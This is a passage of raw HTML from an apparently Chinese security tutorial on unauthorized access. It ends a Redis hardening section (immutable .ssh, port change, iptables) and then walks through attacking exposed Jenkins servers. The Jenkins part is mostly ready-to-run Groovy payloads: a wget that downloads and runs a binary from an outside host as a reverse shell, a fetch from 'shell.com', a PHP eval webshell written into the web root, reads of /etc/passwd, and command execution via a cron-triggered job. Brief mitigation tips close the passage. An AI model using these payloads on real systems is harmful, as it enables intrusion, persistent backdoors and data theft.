YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：<br  /></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">#</span><span class="bash"><span class="hljs-default-comment" style="color: rgb(92, 99, 112);background: rgba(0, 0, 0, 0);display: inline;width: 119px;text-decoration: none solid rgb(92, 99, 112);font-weight: 400;font-style: italic;"># chattr +i ~/.ssh</span></span></code></pre></section><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">注意: 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。<br  /><strong>6.修改默认端口</strong></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">指定Redis监听端口，默认端口为6379，作者在自己的一篇博文中解释了为什么选用6379作为默认端口，因为6379在手机按键上MERZ对应的号码，而MERZ取自意大利歌女Alessia Merz的名字<br  /></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">#</span><span class="bash"><span class="hljs-default-comment" style="color: rgb(92, 99, 112);background: rgba(0, 0, 0, 0);display: inline;width: 172px;text-decoration: none solid rgb(92, 99, 112);font-weight: 400;font-style: italic;"># redis-server --port 6380</span></span></code></pre></section><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>7.防火墙</strong></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">// accept
## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT
## iptables -A INPUT -p udp -s 127.0.0.1 --dport 6379 -j ACCEPT

// drop
## iptables -I INPUT -p tcp --dport 6379 -j DROP
## iptables -I INPUT -p udp --dport 6379 -j DROP

// 保存规则并重启 iptables
## service iptables save
## service iptables restart</code></pre><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x02 Jenkins未授权访问</h2><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>1.扫描探测</strong></h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">弱口令扫描:https://github.com/blackye/Jenkins&nbsp;或者&nbsp;https://github.com/blackye/Jenkins<br  />From:&nbsp;https://www.secpulse.com/archives/2166.html<br  />CVE-2017-1000353:https://blogs.securiteam.com/index.php/archives/3171<br  />提示: script/manage 是管理页面<br  /></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.6085603112840466" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/6_p2YLSBwVFXL3m7u3u6ySxctpmgyrDw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUJDAJHxJiaNNBf06yptTHialFbPp2YLSBwVFXL3m7u3u6ySxctpmgyrDw/640?wx_fmt=png'" data-type="png" data-w="2570" style=""  /></p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">2. 攻击利用<br  /></h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>2.1 反弹shell</strong></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">println "wget http://192.168.3.131:8081/exp -P /tmp/".execute().text
println "chmod +x /tmp/exp".execute().text
println "/tmp/exp".execute().text</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">或者直接通过 Terminal+Plugin<br  />https://wiki.jenkins.io/display/JENKINS/Terminal+Plugin</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>2.2 写webshell</strong></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">1. println "wget http://shell.com/shell.txt -P /var/www/html/".execute().text

2. new File("/var/www/html/shell.php").write('&lt;?php @eval($_POST[shell]);?&gt;');

3. 
def webshell = '&lt;?php @eval($_POST[shell]);?&gt;'
new File("/var/www/html/shell.php").write("$webshell");

4. 
def execute(cmd) {
def proc = cmd.execute()
proc.waitFor()
}
execute( [ 'bash', '-c', 'echo -n "&lt;?php @eval($" &gt; /var/www/html/shell.php' ] )
execute( [ 'bash', '-c', 'echo "_POST[shell]);?&gt;" &gt;&gt; /var/www/html/shell.php' ] )
//参数-n 不要在最后自动换行</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>2.3 读文件</strong></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">try{

text = new File("/etc/passwd").getText();

out.print text

} catch(Exception e){

}</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>2.4 执行命令</strong></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">def sout = new StringBuilder(), serr = new StringBuilder()
def proc = 'cat /etc/passwd'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out&gt; $sout err&gt; $serr"</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>回显注意点</strong></p><ul style="" class=" list-paddingleft-2"><li><p>Result: 0 表示成功写入</p></li><li><p>Result: 1 表示目录不存在或者权限不足 写入失败</p></li><li><p>Result: 2 表示构造有异常 写入失败</p></li></ul><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.3310911808669656" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/7_hsy1EOn029HGZuqVAWASxCD68eficA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUkYv9bgc7xCSCVZgx9a0EwDYdHhsy1EOn029HGZuqVAWASxCD68eficA/640?wx_fmt=png'" data-type="png" data-w="2676" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">jenkins可以对每个用户分配不同的权限，如Overall/RunScripts或者Job/Configure权限<br  />某些版本匿名用户可以访问asynchPeople 可爆破密码（通常很多密码跟用户名一样或者是其他弱口令(top1000)，尤其是内网）<br  /></p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>3. 模拟低权限</strong></h4><h6 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;color: rgb(119, 119, 119);text-rendering: optimizelegibility;font-size: 1em;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">省略掉注册并且安装plugin的傻瓜式操作</h6><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">默认安装的情况下，匿名用户是没有任何权限的，这里修改配置，让匿名用户只拥有 查看Job、Job Configure 权限</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">1.点击 管理(Manage Jenkins) - Configure Global Security</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">2.在 添加用户/组(User/group to add): 填入当前登录的用户名，然后点击 Add，移到最右侧，点击 ✔️，让用户拥有所有权限<br  />此步非常重要，不然保存后会导致 admin is missing the Overall/Read permission 错误,如下图所示<br  /></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.6264591439688716" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/8_Cxl3KWRibt6svYTHDHX3vdVeEqyibg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUpWHJ9QAFBSKVShleO9g3dgRlkeCxl3KWRibt6svYTHDHX3vdVeEqyibg/640?wx_fmt=png'" data-type="png" data-w="2570" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">3.然后访问&nbsp;http://127.0.0.1:8080/newJob&nbsp;,名称填 Test，类型选择 构建一个自由风格的软件项目(Freestyle project )后点击 Save,如下图所示代表创建成功<br  /></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.329441201000834" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/9_Nzbwr2ahicMkWO9icPX4vdNqIqn76A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUhicnYgJ0OjlAjibbLohAhH6K8qtVNzbwr2ahicMkWO9icPX4vdNqIqn76A/640?wx_fmt=png'" data-type="png" data-w="2398" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">4.新建一个无痕窗口,通过匿名访问看到有配置权限<br  /></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.6264591439688716" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/10_BTsXNFzclGlzt9iagvueyKCoup4hjg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUZ8Mzdnc1w9YQAOeQL7rj3PTfbBTsXNFzclGlzt9iagvueyKCoup4hjg/640?wx_fmt=png'" data-type="png" data-w="2570" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">点击 配置(Configure)，在 Build 部分选择 Execute shell<br  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">在 Command 中填入要执行的命令</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">id
uname -a 
cat /etc/passwd</code></pre><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.3316831683168317" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/11_onMrcyUDw7mia7HpzEzgf68wXsibNQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUBJibXeYz937EhCgaM6fkccj1KxuonMrcyUDw7mia7HpzEzgf68wXsibNQ/640?wx_fmt=png'" data-type="png" data-w="2424" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">5.通过查看 Configure 页面的选项，得知在 构建触发器(Build Triggers) 部分可以设置任务 Build 的触发规则，其中有一个 Build periodically，可以通过类似 Crontab 时间规则来触发，这里填入&nbsp;<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;white-space: nowrap;background-color: rgba(0, 0, 0, 0.04);border-width: 1px;border-style: solid;border-color: rgb(225, 225, 232);">*/1 * * * *</code>&nbsp;即每分钟执行一次 Build，点击 Save<br  /></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.4135534317984361" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/12_nUcogwAZmoiaNykfaw9uZW1eG9PHjw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBU3sLBwMwmDazJGhmAvnIGqIYibvnUcogwAZmoiaNykfaw9uZW1eG9PHjw/640?wx_fmt=png'" data-type="png" data-w="2302" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">6.回到 Job 页面，等待一会，在左侧 Build History 可以看到，每分钟都会执行一次 Build，这里点击查看 Console Output<br  /></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.41478599221789886" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/13_dO9e5IMw1VlgSEFSxbkXbwk71Odttw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUyh07OcRAbq5NqSN5IE25KxEibdO9e5IMw1VlgSEFSxbkXbwk71Odttw/640?wx_fmt=png'" data-type="png" data-w="2570" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">命令执行成功<br  /></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.6264591439688716" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/14_wiaGGJTU0W82hZufiboYaWkDCNDARQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUp8nMoAAUAbPHgtO8EDakiciaweI8wiaGGJTU0W82hZufiboYaWkDCNDARQ/640?wx_fmt=png'" data-type="png" data-w="2570" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">匿名用户是没有 Build 权限，即 Job 的页面中是没有 立即构建(Build Now) 按钮，所以这里无法通过点击 立即构建 来触发命令的执行。<br  /></p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>4. 防护措施</strong></h4><ul style="" class=" list-paddingleft-2"><li><p>在Jenkins管理页面添加访问密码。建议您使用由十位以上数字，字母和特殊符号组成的强密码。</p></li><li><p>建议您不要将管理后台开放到互联网上。您可以使用ECS安全组策略设置访问控制，默认策略为拒绝所有通信。您可以根据业务发布情况仅开放* 需要对外用户提供的服务，并控制好访问源IP。</p></li></ul><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, 